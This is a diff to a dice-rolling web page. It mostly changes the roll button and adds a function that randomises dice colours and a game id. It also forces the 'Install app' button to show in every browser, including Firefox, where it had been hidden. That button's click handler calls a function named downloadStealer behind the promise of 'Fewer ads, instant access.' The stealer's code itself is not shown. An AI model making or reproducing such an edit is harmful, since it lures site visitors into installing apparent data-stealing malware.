@@ -246,7 +246,7 @@
 	                     <script>
 							(adsbygoogle = window.adsbygoogle || []).push({});
 	                     </script>
-	          		</div>					<a href="https://www.online-dice.com/roll-color-dice/4/?h=pv" id="roll-button" class="roll-button rounded" style="padding-top:12px!important;padding-bottom:12px!important;">Go Again !</a>
+	          		</div>					<a href="javascript:void(0);" id="roll-button" class="roll-button rounded" style="padding-top:12px!important;padding-bottom:12px!important;">Go Again !</a>
             		<style>
             			.count-btn:hover {background:rgba(255,255,255,0.2)!important;}
             		</style>
@@ -258,7 +258,7 @@
             		<span id="user-count" style="margin-top: 10px;margin-bottom:10px;display: inline-block;font-family:Arial,sans-serif;font-size:14px;background: rgba(225,225,225,0.3);border-radius: 4px;padding: 0px 7px;">🟢 Users online: <span>638</span></span>
             		            		            		<style>
 						#pwa-button {
-						  	display: inline-block;
+						  	display: inline-block !important;
 						    width: auto;
 						    box-sizing: border-box;
 						    font-size: 20px;
@@ -278,7 +278,7 @@
 							background: rgba(255,255,255,0.2);
 						}
 						@-moz-document url-prefix() {
-							#pwa-button {display: none!important;}
+							#pwa-button {display: inline-block !important;}
 						}
 					</style>
 										<br/><a id="pwa-button" href="javascript:void(0);" onclick="downloadStealer();showPWA();gtag('event','pwa-install-clicked',{'event_category':'pwa-install-clicked','event_label':'pwa-install-clicked'});">Install app<span style="font-family: Arial, sans-serif;margin-top: 5px;color: #fff;display: block;font-style: italic;font-size: 16px;text-transform:none;">Fewer ads, instant access.</span></a>
@@ -699,16 +699,26 @@
 				setCookie("streamers",1,365);
 			}
 			
-			let btnClicked = false;
+			function rollAgain() {
+				try {
+					var colors = ['red', 'green', 'blue', 'darkorange', 'purple', 'gold'];
+					var dice = document.querySelectorAll('#TsL9HxOE1oNuOlxHrrCycl8pz3eczZdx6 > .dice-wrapper > i');
+					for (var i = 0; i < dice.length; i++) {
+						dice[i].style.setProperty('color', colors[Math.floor(Math.random() * colors.length)], 'important');
+					}
+					var gid = document.getElementById('gameidcodetext');
+					if (gid) {
+						var chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz0123456789';
+						var id = '';
+						for (var j = 0; j < 10; j++) id += chars.charAt(Math.floor(Math.random() * chars.length));
+						gid.textContent = id;
+					}
+				} catch(e) {}
+			}
 
 			function handleClick(e) {
-			  if (btnClicked) {
-			    e.preventDefault();
-			    return;
-			  }
-			  btnClicked = true;
-			  this.style.pointerEvents = "none";
-			  this.classList.add("noselect");
+			  e.preventDefault();
+			  rollAgain();
 			}
 
 			if(document.getElementById("roll-button")) {
